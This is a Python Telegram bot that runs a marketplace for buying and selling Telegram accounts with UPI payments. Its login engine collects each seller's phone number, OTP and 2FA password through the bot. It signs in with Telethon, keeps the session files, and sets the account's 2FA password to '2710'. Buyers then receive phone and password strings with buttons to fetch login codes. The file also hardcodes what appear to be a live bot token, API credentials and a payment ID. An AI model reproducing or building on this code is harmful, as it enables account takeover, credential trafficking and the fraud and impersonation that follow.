import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import asyncio
import os
import threading
import re
import time
import sys
from flask import Flask

# --- HOSTING PERSISTENCE (24/7) ---
app = Flask('')
@app.route('/')
def home(): return "<h1>SYSTEM STATUS: MAXIMUM OVERDRIVE 🚀</h1>"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CORE CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- MULTI-LAYERED DATABASE ---
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes', 
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
    'pending_deposits': {},
    'bot_logs': [],
    'maintenance': False
}

# Ensure Session Directory
if not os.path.exists('sessions'): os.makedirs('sessions')
active_logins = {}

# --- HELPER FUNCTIONS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton('💰 BALANCE'), types.KeyboardButton('📥 DEPOSIT'),
        types.KeyboardButton('📤 SELL ID'), types.KeyboardButton('🛒 BUY ID'),
        types.KeyboardButton('📞 SUPPORT'), types.KeyboardButton('📊 STATS')
    )
    return markup

# --- START & REGISTRATION ---
@bot.message_handler(commands=['start'])
def start_handler(message):
    uid = message.from_user.id
    if uid not in db['users']:
        db['users'][uid] = {
            'balance': 0, 
            'total_buy': 0, 
            'total_sell': 0, 
            'reg_date': time.ctime(),
            'banned': False
        }
    
    welcome_text = (
        "🔥 **WELCOME TO PRIME MASTER BOT v10.0**\n\n"
        "India's Most Advanced ID Selling/Buying Bot.\n"
        "⚡ **Features:** Auto 2FA, Instant Code, Secure Deposit.\n\n"
        "Use buttons below to navigate."
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_menu())

# --- FEATURE: DEPOSIT SYSTEM (STRICT VERIFICATION) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def init_deposit(m):
    msg = bot.send_message(m.chat.id, "💵 **Enter Amount to Deposit (₹):**\n(Minimum: ₹10)")
    bot.register_next_step_handler(msg, process_deposit_amt)

def process_deposit_amt(m):
    if not m.text.isdigit() or int(m.text) < 10:
        return bot.send_message(m.chat.id, "❌ **Invalid Amount!** Please enter a number ≥ 10.")
    
    amt = int(m.text)
    instruction = (
        f"💳 **Payment Request**\n\n"
        f"Step 1: Pay ₹{amt} to UPI ID:\n`{db['upi']}`\n\n"
        f"Step 2: Copy the **12-Digit UTR/Transaction ID**.\n\n"
        f"Step 3: Paste the UTR below 👇"
    )
    msg = bot.send_message(m.chat.id, instruction)
    bot.register_next_step_handler(msg, process_deposit_utr, amt)

def process_deposit_utr(m, amt):
    utr = m.text.strip()
    if len(utr) != 12 or not utr.isdigit():
        return bot.send_message(m.chat.id, "❌ **Invalid UTR!** Must be exactly 12 digits.\nTry again from '📥 DEPOSIT'.")
    
    msg = bot.send_message(m.chat.id, "📸 **Last Step:** Send the payment **Screenshot** for verification:")
    bot.register_next_step_handler(msg, finalize_deposit, amt, utr)

def finalize_deposit(m, amt, utr):
    if m.content_type != 'photo':
        return bot.send_message(m.chat.id, "❌ **Error:** Screenshot not detected. Request cancelled.")
    
    uid = m.from_user.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ APPROVE", callback_data=f"dep_acc_{uid}_{amt}"),
        types.InlineKeyboardButton("❌ REJECT", callback_data=f"dep_rej_{uid}")
    )
    
    # Notify Admins
    for admin_id in db['admins']:
        try:
            bot.send_photo(
                admin_id, 
                m.photo[-1].file_id, 
                caption=f"💰 **NEW DEPOSIT**\nUser: `{uid}`\nAmount: ₹{amt}\nUTR: `{utr}`",
                reply_markup=markup
            )
        except: pass
        
    bot.send_message(m.chat.id, "⏳ **Submitted!** Admin will verify your payment within 5-10 minutes.")

# --- FEATURE: LOGIN ENGINE & AUTO 2FA CHANGE ---
def run_login_engine(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    
    async def task():
        await client.connect()
        try:
            req = await client.send_code_request(phone)
            active_logins[chat_id] = {
                'client': client, 'phone': phone, 'hash': req.phone_code_hash, 
                'loop': loop, 'country': country, 'mode': mode
            }
            msg = bot.send_message(chat_id, "📩 **OTP Sent!** Enter the 5-digit code:")
            bot.register_next_step_handler(msg, collect_otp)
        except Exception as e:
            bot.send_message(chat_id, f"❌ **Error:** {str(e)}")

    loop.run_until_complete(task())

def collect_otp(m):
    uid = m.chat.id
    data = active_logins.get(uid)
    if not data: return
    
    async def verify():
        try:
            await data['client'].sign_in(data['phone'], m.text.strip(), phone_code_hash=data['hash'])
            await finish_login(m, data)
        except SessionPasswordNeededError:
            msg = bot.send_message(uid, "🔐 **2FA detected!** Enter Password:")
            bot.register_next_step_handler(msg, collect_2fa)
        except Exception as e:
            bot.send_message(uid, f"❌ **OTP Failed:** {str(e)}")
    
    data['loop'].run_until_complete(verify())

def collect_2fa(m):
    uid = m.chat.id
    data = active_logins.get(uid)
    async def verify():
        try:
            await data['client'].sign_in(password=m.text.strip())
            await finish_login(m, data, m.text.strip())
        except:
            bot.send_message(uid, "❌ **Incorrect 2FA!**")
    data['loop'].run_until_complete(verify())

async def finish_login(m, data, pwd="None"):
    uid = m.chat.id
    if data['mode'] == "sell":
        # AUTO 2FA CHANGE TO 2710
        try:
            await data['client'](functions.account.UpdatePasswordSettingsRequest(
                new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="PRIME")
            ))
            info = "✅ 2FA changed to 2710."
        except: info = "⚠️ 2FA Change manually required."
        
        # Notify Admin for Approval
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sell_acc_{uid}_{data['country']}"),
                   types.InlineKeyboardButton("❌ REJECT", callback_data=f"sell_rej_{uid}"))
        
        for adm in db['admins']:
            bot.send_message(adm, f"📦 **SELL REQ**\nUser: `{uid}`\nNum: `{data['phone']}`\nPass: `2710`", reply_markup=markup)
        bot.send_message(uid, f"✅ Login Successful! {info}\nWaiting for admin approval.")
    else:
        # Stock Addition
        db['stock'].setdefault(data['country'], []).append(f"{data['phone']}:PASS:{pwd}")
        bot.send_message(uid, f"✅ ID {data['phone']} added to {data['country']} Stock.")

# --- USER FEATURES ---
@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def show_bal(m):
    bal = db['users'].get(m.from_user.id, {}).get('balance', 0)
    bot.send_message(m.chat.id, f"💳 **Your Current Balance:** ₹{bal}")

@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def show_support(m):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💬 MESSAGE OWNER", url="https://t.me/god_abhay"))
    bot.send_message(m.chat.id, "🆘 **Need Help?** Click the button below to chat with us.", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_panel(m):
    if not db['buy_rates']:
        return bot.send_message(m.chat.id, "🛒 **Market is currently closed.**")
    
    markup = types.InlineKeyboardMarkup()
    for country, price in db['buy_rates'].items():
        stk = len(db['stock'].get(country, []))
        markup.add(types.InlineKeyboardButton(f"{country} - ₹{price} (Stk: {stk})", callback_data=f"buy_{country}"))
    bot.send_message(m.chat.id, "🛒 **Select a category to buy:**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def query_handler(call):
    p = call.data.split('_')
    uid = call.from_user.id
    
    if p[0] == 'dep': # Deposit Actions
        if p[1] == 'acc':
            target, amt = int(p[2]), int(p[3])
            db['users'][target]['balance'] += amt
            bot.send_message(target, f"✅ **Deposit Success!** ₹{amt} credited.")
            bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
        else:
            bot.send_message(int(p[2]), "❌ **Deposit Rejected!** Invalid UTR or Screenshot.")
            bot.edit_message_caption("Rejected ❌", call.message.chat.id, call.message.message_id)

    elif p[0] == 'buy':
        country = p[1]
        price = db['buy_rates'].get(country, 0)
        if db['users'][uid]['balance'] < price or not db['stock'].get(country):
            return bot.answer_callback_query(call.id, "Insufficient Balance or No Stock!", show_alert=True)
        
        data = db['stock'][country].pop(0)
        db['users'][uid]['balance'] -= price
        phone = data.split(':')[0]
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📩 GET CODE", callback_data=f"code_{phone}"),
                   types.InlineKeyboardButton("🚪 LOGOUT", callback_data=f"out_{phone}"))
        bot.send_message(uid, f"🛒 **PURCHASE SUCCESS**\n\n🌍 Country: {country}\n📦 Data: `{data}`\n🔑 Pass: 2710 (Default)", reply_markup=markup)

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['addcountry'])
def adm_country(m):
    if not is_admin(m.from_user.id): return
    try:
        _, name, buy, sell = m.text.split()
        db['buy_rates'][name.upper()] = int(buy)
        db['sell_rates'][name.upper()] = int(sell)
        db['stock'].setdefault(name.upper(), [])
        bot.reply_to(m, f"✅ Added {name.upper()} | Buy: {buy} Sell: {sell}")
    except: bot.reply_to(m, "Format: `/addcountry INDIA 40 25` ")

@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_init(m):
    if not db['sell_rates']: return bot.send_message(m.chat.id, "❌ Selling market is closed.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(m.chat.id, "Select Country to Sell:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_start(m):
    country = m.text.split()[1]
    msg = bot.send_message(m.chat.id, "📞 Enter Phone Number (+ format):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=run_login_engine, args=(m.chat.id, ms.text, country, "sell")).start())

bot.polling(none_stop=True)
